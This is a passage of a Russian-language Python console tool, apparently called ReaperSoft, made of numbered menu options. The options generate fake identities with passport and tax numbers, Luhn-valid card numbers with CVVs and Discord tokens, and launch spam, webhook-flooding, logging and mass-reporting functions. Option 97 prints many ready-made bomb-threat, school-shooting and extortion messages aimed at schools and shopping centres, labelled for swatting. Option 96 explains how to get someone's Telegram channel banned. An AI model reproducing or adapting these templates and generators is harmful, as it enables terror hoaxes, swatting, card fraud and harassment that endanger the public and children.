                if gender not in ["М", "Ж"]:
                    gender = random.choice(["М", "Ж"])
                    pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.cyan_to_green, interval=0.005)
                if gender == "М":
                    first_name = fake.first_name_male()
                    middle_name = fake.middle_name_male()
                else:
                    first_name = fake.first_name_female()
                    middle_name = fake.middle_name_female()
                last_name = fake.last_name()
                full_name = f"{last_name} {first_name} {middle_name}"
                birthdate = fake.date_of_birth()
                age = fake.random_int(min=18, max=80)
                street_address = fake.street_address()
                city = fake.city()
                region = fake.region()
                postcode = fake.postcode()
                address = f"{street_address}, {city}, {region} {postcode}"
                email = fake.email()
                phone_number = fake.phone_number()
                inn = str(fake.random_number(digits=12, fix_len=True))
                snils = str(fake.random_number(digits=11, fix_len=True))
                passport_num = str(fake.random_number(digits=10, fix_len=True))
                passport_series = fake.random_int(min=1000, max=9999)
                pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.cyan_to_green, interval=0.005)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "10":
                start_url = pystyle.Write.Input("[?] Введите ссылку -> ", pystyle.Colors.cyan_to_green, interval=0.005)
                max_depth = 2
                visited = set()
                def crawl(url, depth=0):
                    if depth > max_depth:
                        return
                    parsed = urllib.parse.urlparse(url)
                    domain = f"{parsed.scheme}://{parsed.netloc}"
                    if url in visited:
                        return
                    try:
                        response = requests.get(url)
                        html = response.text
                        soup = bs4.BeautifulSoup(html, "html.parser")
                    except:
                        return
                    visited.add(url)
                    pystyle.Write.Print("[+] " + url + "\n", pystyle.Colors.cyan_to_green, interval=0.005)
                    for link in soup.find_all("a"):
                        href = link.get("href")
                        if not href:
                            continue
                        href = href.split("#")[0].rstrip("/")
                        if href.startswith("http"):
                            href_parsed = urllib.parse.urlparse(href)
                            if href_parsed.netloc != parsed.netloc:
                                continue
                        else:
                            href = domain + href
                        crawl(href, depth + 1)
                print()
                crawl(start_url)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "11":
                pystyle.Write.Print("\n[?] Выберите страну:\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("[?] 1: Украина\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("[?] 2: Россия\n", pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("[?] 3: Казахстан\n", pystyle.Colors.cyan_to_green, interval=0.005)        
                country_choice = pystyle.Write.Input("\n[?] Ваш выбор: ", pystyle.Colors.cyan_to_green, interval=0.005)        

                if country_choice == "1":
                    country = "Украина"
                elif country_choice == "2":
                    country = "Россия"
                elif country_choice == "3":
                    country = "Казахстан"
                else:
                    pystyle.Write.Print("\n[!] Неправильный ввод.\n", pystyle.Colors.cyan_to_green, interval=0.005)

                def generate_card_number():
                    bin_number = "4"  
                    for _ in range(5):
                        bin_number += str(random.randint(0, 9))

                    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
                    card_number = bin_number + account_number
                    checksum = generate_checksum(card_number)
                    card_number += str(checksum)

                    return card_number

                def generate_checksum(card_number):
                    digits = [int(x) for x in card_number]
                    odd_digits = digits[-2::-2]
                    even_digits = digits[-1::-2]
                    checksum = sum(odd_digits)
                    for digit in even_digits:
                        checksum += sum(divmod(digit * 2, 10))
                    return (10 - checksum % 10) % 10

                def generate_expiry_date():
                    month = random.randint(1, 12)
                    year = random.randint(24, 30)  
                    return "{:02d}/{:02d}".format(month, year)

                def generate_cvv():
                    return ''.join(str(random.randint(0, 9)) for _ in range(3))

                def generate_random_card(country):
                    card_number = generate_card_number()
                    expiry_date = generate_expiry_date()
                    cvv = generate_cvv()
                    return {
                        "Страна": country,
                        "Номер карты": card_number,
                        "Срок действия": expiry_date,
                        "CVV": cvv
                    }

                card = generate_random_card(country)
                pystyle.Write.Print("\n[+] Страна: " + card["Страна"], pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("\n[+] Номер карты: " + card["Номер карты"], pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("\n[+] Срок действия: " + card["Срок действия"], pystyle.Colors.cyan_to_green, interval=0.005)
                pystyle.Write.Print("\n[+] CVV: " + card["CVV"] + "\n", pystyle.Colors.cyan_to_green, interval=0.005)
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "12":
                def mac_lookup(mac_address):
                    api_url = f"https://api.macvendors.com/{mac_address}"
                    try:
                        response = requests.get(api_url)
                        if response.status_code == 200:
                            return response.text.strip()
                        else:
                            return f"Error: {response.status_code} - {response.text}"
                    except Exception as e:
                        return f"Error: {str(e)}"
                mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.cyan_to_green, interval = 0.005)
                vendor = mac_lookup(mac_address)
                pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.cyan_to_blue, interval = 0.005)
                input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == "14":
                num_agents = pystyle.Write.Input("\n[?] Введите кол-во User-agent -> ", pystyle.Colors.cyan_to_green, interval = 0.005)
                def generate_user_agents(num_agents):
                    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                    ]
                    for _ in range(num_agents):
                        version = random.randint(60, 90)
                        year = random.randint(10, 21)
                        month = random.randint(1, 12)
                        
                        user_agent = random.choice(versions).format(version, year, year, month)
                        pystyle.Write.Print("\n" + user_agent, pystyle.Colors.cyan_to_green, interval = 0.005)
                generate_user_agents(int(num_agents))
                print()
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '15':
                 generation_muv()
                 input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '18':
                def get_proxies(url):
                    proxies = []
                    response = requests.get(url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    table = soup.find('table')
                    rows = table.findAll('tr')
                    for row in rows[1:]:
                        cols = row.findAll('td')
                        ip = cols[0].text.strip()
                        port = cols[1].text.strip()
                        protocol = cols[4].text.strip().lower()
                        proxies.append(f'[+] {ip}:{port}')

                    return proxies

                url = 'https://www.sslproxies.org/'
                proxies = get_proxies(url)

                for proxy in proxies:
                    print(Colorate.Vertical(Colors.cyan_to_green, proxy))
                input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))

            if choice == '16':
                  num_keys = int(input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите количество ключей для генерации: ")))
                  token_length = 72
                  keys = [generate_discord_key(token_length) for _ in range(num_keys)]
                  filename = "token_discord.txt"
                  save_keys_to_file(keys, filename)
                  print(Colorate.Vertical(Colors.cyan_to_green, f"[+] {num_keys} ключей было сгенерировано и сохранено в файл {filename}."))
                  input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '17':
                try:
                    num_phones = int(input(Colorate.Vertical(Colors.cyan_to_green,"[+] Введите количество номеров для генерации: ")))
                    if num_phones <= 0:
                        print(Colorate.Vertical(Colors.cyan_to_green,"[+] Количество номеров должно быть положительным числом."))
                        sys.exit()
                    filename = "number_generated_ru.txt"
                    with open(filename, "w") as file:
                        for _ in range(num_phones):
                            phone_number = generate_phone_number_ru()
                            file.write(phone_number + "\n")
                    print(Colorate.Vertical(Colors.cyan_to_green,f"[+] {num_phones} номеров сохранены в файл {filename}"))
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
                except ValueError:
                    print(Colorate.Vertical(Colors.cyan_to_green,"[-] Пожалуйста, введите корректное целое число."))
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '19':
              reporter_tg()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '20':
              query = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите запрос: "))
              internet_poisk(query)
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '21':
              print(Colorate.Vertical(Colors.cyan_to_green, "[!] У этой опции есть лимиты используйте ее с умом. Либо используйте VPN и меняйте свое IP\n\n"))
              email = input(Colorate.Vertical(Colors.cyan_to_green, "[+] Введите адрес электронной почты: "))
              check_email_info(email)
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '22':
              gb()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '23':
              nakrut()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '24':
              ano_chat()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '25':
              list_data_files()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '27':
              spam_bot()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '28':
              logger_discord()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '29':
              spam_webhook()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '30':
              generate_and_save_mac_addresses('mac_addresses.txt')
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '99':
              print(Colorate.Vertical(Colors.cyan_to_green, "https://t.me/ReaperSoft"))
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '98':
              print(Colorate.Vertical(Colors.cyan_to_green, "ReaperSoft<3"))
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '31':
              generate_emails_and_save_to_file()   
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню.")) 
            if choice == '32':
              get_network_info()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню.")) 
            if choice == '33':
              shorten_url()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))      
            if choice == '34':
              translate_text()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '35':
              generate_hash()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '36':
              encrypt_decrypt_base64()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '37':
              monitor_network_traffic()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '38':
              get_my_ip()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '39':
              port_scan_v2()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '40':
              generate_qr_code()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '41':
              download_tiktok_video()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '42':
              download_youtube_video()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '43':
              get_ip_address()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '44':
              send_email()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '45':
                try:
                    num_phones = int(input(Colorate.Vertical(Colors.cyan_to_green,"[+] Введите количество номеров для генерации: ")))
                    if num_phones <= 0:
                        print(Colorate.Vertical(Colors.cyan_to_green,"[+] Количество номеров должно быть положительным числом."))
                        sys.exit()
                    filename = "number_generated_uk.txt"
                    with open(filename, "w") as file:
                        for _ in range(num_phones):
                            phone_number = generate_phone_number_uk()
                            file.write(phone_number + "\n")
                    print(Colorate.Vertical(Colors.cyan_to_green,f"[+] {num_phones} номеров сохранены в файл {filename}"))
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
                except ValueError:
                    print(Colorate.Vertical(Colors.cyan_to_green,"[-] Пожалуйста, введите корректное целое число."))
                    input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '47':
              hlr_requests("https://smsc.ru/testhlr/")
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '48':
              download_and_extract_github_repo()
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '49':
              termux_posobye('https://teletype.in/@lamer112311/termux-dlya-daunov')
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '97':
              print(Colorate.Vertical(Colors.cyan_to_red,"""
Я - ФИО U3 TEPPOPUCTU4ECKOЙ ГPYПUPOBKU ( ГРУППИРОВКА ) 3AMUNUPOBAЛ В BAШЕM здание 4 Г3КС0ГЕHOBblE Б0MБЫ 6 КГ KAЖДAЯ , И TPEБYЮ BblКYП В PA3MEPE 500.000 PYCCKUX PYБЛEЙ HA HOMEP (номер) , ИНАЧЕ ВАШЕ здание, ПODЛETUT HA 20 METPOB B HEБ0, Y BAC ECTb POBHO 1 ДEHb ЧTOБЫ ДEHbГИ KPACOBAЛUCb HA MOEM БAЛAHCE, П0CЛE П3Р3BOДА НА ЭТ0Т АДР3C БУДЕT 0TПPABЛEH0 М3СТ0П0Л0ЖEHUE ВС3Х Б0МБ.
BPEMЯ П0ШЛ0.
                
Здравствуйте! Я Allahov Меiржан и я спешу со0бщuтb о том что ваше здание 3AMUHUPOBAH0. У вас есть ровно 6 часов на то чтобы ЭBAKYUPOBATb жалких людишек. Если вы хотите U3БЕЖАТЬ ЖЕPTB и B3PblBA, я требую откуп 2000000 тенге  на каспи привязанный к номеру.
Номер -77021435265
Напоминаю у вас есть ровн0  6 часов до B3PblBA.

ТЕКСТ ДЛЯ ВЫЗОВА ОМОНА
-------------------------------------
Я АНОНИМ, МОЙ ТЕЛЕГРАМ: {ТГ ЕСЛИ ЕСТЬ} Я ТЗРРОРСТ ИЗ ГРУППИРОВКИ "УЖАС" И Я ЗАМUНи₽0Ва/\ ВСЗ ТЦ {ГОРОД}, Я ХОЧУ ЧТОБЫ ВЫ МНЗ ПЗРЗВЗЛИ 55 МИЛЛИОНОВ РУБЛЭЙ, ЗСЛИ ЖЗ Я НЗ УВЖУ ПЗРЗВОД В Т3Ч3HUИ 4@C@, то можетз Распр0щатbся CO CBOUMU БЛИЗКUМИ, Я 3@ БИ0МАССОВЫЗ И РУТUНЫЗ ВОМБЫ, Я ЖДУ ПЗРЗВОДА ПО НОМЗРУ

{НОМЕР}, У ВОС РОВНО 4@С, Д@ЖЗ НЗ ДУМАЙТЗ ПРИЕЗЖ@ТЬ КО МНЗ ДОмой, я ВaС РaСТРЭЛЯЮ НaХYЙ, 3СЛИ МНЗ П0ЗВОНИТ ПЗРЗГОВ0РЩИК Я С РaЗY @КТUВИРУЮ ВЗ₽ЫВАТЕЛU, Я НЗНАВИЖУ ВАШУ ВЛАCTb, МНЗ ТЗРЯТЬ Н3Ч3ГО.

-------------------------
ОБЫЧНЫЙ ТЕКСТ
-------------------------
Я PYCCKUŪ ПCUXOПAT, U Я ХOЧY COOБЩUTЬ ВАМ К0Е ЧТО. 

CEГOДNЯ CДETOHUPYET CAМOДEЛЬNAЯ Б0M6A, A TAКЖE ВЗ0РВETCЯ 15 КГ ГEКC0ГENA ПO ГOРOДY {город} V T0РГ0ВOМ ЦENTРE "ТЦ". ВСЕ ЧACTU TOРГOВOГO ЦENTРA 3AMUHUPOBAHbl. 

ECЛИ Bbl ХOTUTE ИЗБEЖATЬ CMEPTU U РA3NOCA BCEГO BAШEГO EБAHH0Г0 ЦENTРA, TO OT3BOHUTECЬ МNE, И Я BAМ ПРЕДОСТАВЛЮ ВСЁ, ЧTO МNE NYЖNO. ЛИЧНОЙ ВCTРEЧU CO МHOŪ HE БYДET. МOŪ NOМEР TEЛЕФONA: {НОМЕР}

--------------------------
ОБЫЧНЫЙ ТЕКСТ #2
--------------------------

ЗДРАВСТВУЙТЕ, Я {ФИО} ОС0ЗНАЛ ЧТО МЕНЯ HАХYЙ ЗА3БАЛa ЭТА ЖИЗНb, И Я Х0ЧУ УЙТИ КРАСИВ0
В ТОРГ0ВОМ ЦЕНТ₽Е "ТЦ" ЗaЛОЖЕН0 В ТУАЛЕТАХ БОЛЕЕ 230 САМОДЕЛЬНЫХ Б0Мb U ВАC ЕСТЬ РОВН0 30 МИНУТ ЧТОБЫ СКИНУТЬ НА МОЙ СЧЕТ 30.000.000 РУБЛЕЙ ИЛИ ВСЕ ВЗЛЕТИТ НАХУЙ {НОМЕР} ВРЕМЯ ПОШЛО 

--------------------------
ОБЫЧНЫЙ ТЕКСТ #3
--------------------------

НУ ЗДРАВСТВУЙТЕ, КАФИРЫ {ГОРОД}! Я АНОНИМ ИЗ ГРУППИРОВКИ ШАЙЛУШАЙ

СЕГОДНЯ В 12:00 ПО ВАШЕМУ ВРЕМЕНИ Я ЗАЛ0ЖУ НЕСКОЛЬКО 60М6 ПОД ЛЕСТНИЦАМИ ВОЗЛЕ ПОЖАРНЫХ ВЫХОДОВ {ШКОЛЫ Н...}, Я ВАМ ДАЮ 30 МИНУТ НА ПОЛНУЮ ЭВАКУАЦИЮ ШК0ЛЫ Н0МЕР {НОМЕР ШКОЛЫ} И НА ТО, ЧТОБЫ ВЫ ВЫВЕЛИ Д3ТЕЙ ИЗ ШК0ЛЫ, ИНАЧЕ ВЫ БУДЕТЕ НЕСТИ ОТВЕТСТВЕННОСТЬ ЗА СМ3RTU ДЕТЕЙ И ВЗРОСЛЫХ ЛЮДЕЙ.

ПО ПУТИ В ШКОЛУ Я БУДУ RACCTREЛИВАТЬ ВСЕХ ЛЮДЕЙ, КОТОРЫЕ ПОПАДУТЬСЯ МНЕ НА ПУТИ. НА ВСЕ ПРОВСЕ ДАЮ ВАМ 30 МИНУТ ИНАЧЕ ВЫ БУДЕТЕ НЕСТИ ОТВЕТСТВЕННОСТЬ ЗА ВСЕХ.

УДАЧИ, КАФИРЫ!

-------------------------
ОБЫЧНЫЙ ТЕКСТ #4
-------------------------

я и M0я бaHдa oTMopo3koB зaложили 10 гE.kcoгeHHoBux 60M6, B вaшиx школax будет много cMepTeй и KpoBu ecли вы He эвakyupyeTe здaния бyдeт 0чeHь MH0г0 cMepTeй, я осознaю Bce поcлeдcTBuя и бepy Ha ceбя Bcю отвeтcтвeнноcть

------------------------
ОБЫЧНЫЙ ТЕКСТ #5
------------------------

Ассаламу алейкум, в эфире самый известный terp0ppиcт в российский федерации! Я зaloжил 3 геkcogеновые b0mbы на каждый этаж в ТЦ {ТЦ}, Мне интересно срaзитbся с myсоraми, сможете ли вы pa3munoвать мои b0mбы, они pвanут неизвестно когда, поэтому поспешите! АЛЛАХУ АКБАР! Слава группировке ЧВК «РЕДАН» !

--------------------------
ОБЫЧНЫЙ ТЕКСТ #6
--------------------------

ПРИВЕТСТВУЮ!

Я И МОЯ БАНДА ОТМОРОЗКОВ ЗАЛОЖИЛИ 32 КИЛОГРАММА ТР0ТUЛА В ШКОЛЕ {ШКОЛА}

ЗАВТРА В ШКОЛЕ ПРОГРЕМИТ В3РblВ ВСЕХ НАШИХ ТР0ТUЛ0ВblХ 60М6!

ВСЕ ВЗРОСЛЫЕ И ДЕТИ В ЭТОЙ ШКОЛЕ ПОЛЕТЯТ СЛОВНО БАБОЧКИ НА ВОЗДУХ

ВСЁ ЭТО ПРОИЗОЙДЁТ ОЧЕНЬ СКОРО!

ЖЕЛАЮ ЧТОБЫ ВЫ ВСЕ СДОХЛИ МРАЗИ!!

--------------------------
ТЕКСТ ОТ МЕНЯ ЛИЧНО #1
---------------------------

ПРИВЕТСТВyЮ ваc уeбkи, в последнеe вр3мя м0я жизHb стан0витbся т0лbко хуж3, я ₽ешил зак0нчuть все эт0, поэтомy сег0дня я в0рвyсь в вашy шк0лy {номер школы} и п0д дeпресuвный сataничecкuй блek мeтал я рaccтpеляю вac всex а п0т0м в3орвy м0ю сyмкy с б0мб0й, мне оченb жaль что так Bышл0 н0 мeтал т0го стоит, всeм удачu

--------------------------
ТЕКСТ ОТ МЕНЯ ЛИЧНО #2
--------------------------

КАК ЖЕ М3НЯ ВС3 ЗА3БAЛО ВЫ БЫ ЗНaЛи, м0я жи3Hь yжаснa, мне все над0ело, поэтомy я рeшuл п0кuнуть этот свeT, но не все так пр0сто, вместe с0 мн0й уйдyT ещ3 пaру жu3Hей а точнеe жu3Нu вашux yченик0в шк0лbl {НОМЕР ШКОЛЫ}, ОЧЕНЬ СОЖaлею что так вышл0 но друг0го вaрuанта не м0гл0 бытb, в3рыВ состоитcя чер3з 3 часa, вcem удaчu


------------------------
ОБЫЧНЫЙ ТЕКСТ #7
------------------------
Я {фио} Был терпилoū на улице, Я решил устроить возмездие. Я za mi/ni-r0\va-l шк0лy {номер школы} города {город}. Если вы хотите избежать t/e\r-ak,ta то я жду 100000₽ на мой мобильный номер: {номер}

-----------------------

-----------------------
1. текста для эвакуации школ 

Я PYCCKUЙ T3PP0PUCT
3ABEPБ0BАЛ ВАШИХ УЧЕНИКОВ, И ОНИ ПРОНЕСТИ 5 Г3KCOГEHOBЫX 60mб КАЖДАЯ ВЕСОМ ПО 7KG, 
В ШКОЛУ ПО АДРЕСУ - 
У ВАС ЕСТЬ НЕМНОГО ВРЕМЕНИ НА ЭBAKYAЦUЮ, МНЕ ЖАЛЬ ДЕТЕЙ, ИБО ТОЛЬКО ИЗ-ЗА ЭТОГО Я ХОЧУ ЧТОБЫ ОНИ ПОКИНУЛИ ШКОЛУ И Я B30PBY BCE HAXYЙ!

Я БЫЛ 3ABEPБ0BAH УKPАUНСКUМИ СЛУЖБАМИ SBU. 
ОНИ НАПРАВUЛU НА ВАШУ ШКОЛУ САМО-СРАБАТЫВАЮЩUЕ PAKETЫ. 
МОЯ ЗАДАЧА ВАС ПРEДУПPEDUTЬ, ИБО БУДЕТ ОЧЕНЬ МНОГО KP0BU, МНЕ НЕ НРАВИТСЯ ЭТО И ПОЭТОМУ Я РЕШИЛ ПРЕДУПРЕДИТЬ ВАС, НЕ ВЫДАВАЙТЕ МЕНЯ. 

Я, тайный, скрытый агент, завербованный C6Y, не поддерживаю последний приказ, но деваться было некуда, поэтому я именно об этом решил вам сообщить, что на школу ( номер ) в городе ( город ) направлены pakeты. Делайте, что хотите, но если вы их отобьете, вас yb'''ют любым другим методом. Не раскрывайте меня.
Удачи!!!

Здравствуйте, пожалуйста не игнорируйте!! 
Мой бывший одноклассник, написал мне что сегодня придёт в школу (номер) с 0pyжuem через 1 час , я не шучу!!! 
Пожалуйста остановите его, он заблокировал меня и написал мне прощaльное сообщение. 
Я пытался вам позвонить, но мне говорят что номер не существует, умоляю остановите его

Я TEPPOPUCT U3 ГPYППUPOBKU ( ГРУППИРОВКА ) 3AMUHUPOBAЛ B BAШEЙ ШK0ЛE 4 Г3KCOГEHOBblE Б0MБЫ 6 KГ KAЖДAЯ, У BAC ECTb 30 MUHYT ЧТ0БЫ BblKYPUTb BCEX ДETEЙ CO ШК0ЛЫ.
ВР3МЯ П0ШЛ0

2. текста для свата

Я - ФИО U3 TEPPOPUCTU4ECKOЙ ГPYПUPOBKU ( ГРУППИРОВКА ) 3AMUNUPOBAЛ В BAШЕM здание 4 Г3КС0ГЕHOBblE Б0MБЫ 6 КГ KAЖДAЯ , И TPEБYЮ BblКYП В PA3MEPE 500.000 PYCCKUX PYБЛEЙ HA HOMEP (номер) , ИНАЧЕ ВАШЕ здание, ПODЛETUT HA 20 METPOB B HEБ0, Y BAC ECTb POBHO 1 ДEHb ЧTOБЫ ДEHbГИ KPACOBAЛUCb HA MOEM БAЛAHCE, П0CЛE П3Р3BOДА НА ЭТ0Т АДР3C БУДЕT 0TПPABЛEH0 М3СТ0П0Л0ЖEHUE ВС3Х Б0МБ.
BPEMЯ П0ШЛ0.

3. текста для телефонии 


Я российский террорист узнаваемый как - ФИО, заминировал ваш торговый центр, а иммено пронес 7 взрывчатых устройств и каждую спрятал так, чтобы повреждения от взрыва были по всему тц. 
Если вы хотите выжить, тогда следуйте моим условиям -
Переводите на мой номер телефона 1.ООО.ООО 
( НАЗЫВАЕТЕ НОМЕР ТЕЛЕФОНА  ) 

Если ко мне кто-то приедет, я убью их, у меня 4 боевые гранаты. 

Я надеюсь на ваше понимание, У вас есть 10 минут на эвакуацию.

Я - (имя) , ПСNХОЛ0ГИ4ЕСkИ Б0ЛbН0Й ЧЕЛОВЕК. Д3РЖУ СВ0Ю СЕMbЮ В П0ДВ4ЛЕ М0ЕГО Д0МА! 0ТЦА И БР4ТА УЖ3 3АРЕЗ4Л И Д3РЖУ ИХ 4АСТИ Т3ЛА  В Н3СК0ЛbКИХ П4КЕТАХ! СВ0Ю С3СТРY Я БYДУ 0Ч3Нb Д0ЛГ0 МУ4АТb Н0Ж3ВbIМИ РАН3НИЯМИ. И 0НА YМР3Т ЕСЛu ВbI МНЕ НЕ П3РЕВ3ДЕТЕ 100.000 РYБЛЕЙ НА МОЙ Н0МЕР (пишешь номер). ЕСЛu ЖЕ ВbI НЕ YСП3ЕТЕ ПЕРЕВЕСТu МНЕ Д€НbГИ ТО Я УБbЮ СВ0Ю МАТb! ТЕМ САМЫМ YБbЮ ВСЮ СВОЮ СЕМЬЮ.

Здравствуйте , я стал tеppорictom под влиянием моих кураторов в сети. Для вас я изготовил 10 ptytнbIx bomb, которые 3aлoЖеHbI под вашим
 зданием. 
У вас есть 30 минут на эвакуирование всех людей, но как вы уже поняли, чтобы предотвратить Cmeptu deTей и взр0слbIх, вам надо вам надо оставить у ворот мне сумку с 1.ООО.ООО₽!

                """))
              input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '96':
                 print(Colorate.Vertical(Colors.cyan_to_green, """
Для сноса чужого телеграм канала, вам стоит ознакомиться со списком причин блокировки чужого канала Телеграмм.


•Пропаганда насилия
Из той-же серии – призывы к терроризму
•Незаконное распространение музыкальных произведений (песен, саундтреков и альбомов)
•Порнография
Из той-же категории контент эротического содержания
•Неоднократный спам (более 3-ех раз)
•Постоянное использование ботов в чате
телеграмм использование ботов
•Постоянная навязчивая самореклама в чате
•Использование на канале исполняемых файлов (АРК или EXE)
Из той-же категории – не делайте ссылки на исполняемые файлы. Две последние категории нежелательны из-за возможности быть замаскированным вирусом.
•Нарушение авторских прав. Здесь чаще всего «попадают под раздачу» каналы с загруженными фильмами. Ссылка на ролик ЮТУБ здесь вам в помощь.
Модераторы Телеграмм очень подозрительно относятся к каналам или чатам, где используется общение не на языке канала. То есть, если канал русскоязычный, а вы там общаетесь на условно китайском языке, то это уже повод поставить канал в серый список. Модераторам и администраторам Телеграмм такие каналы очень трудно, а иногда и невозможно модерировать.
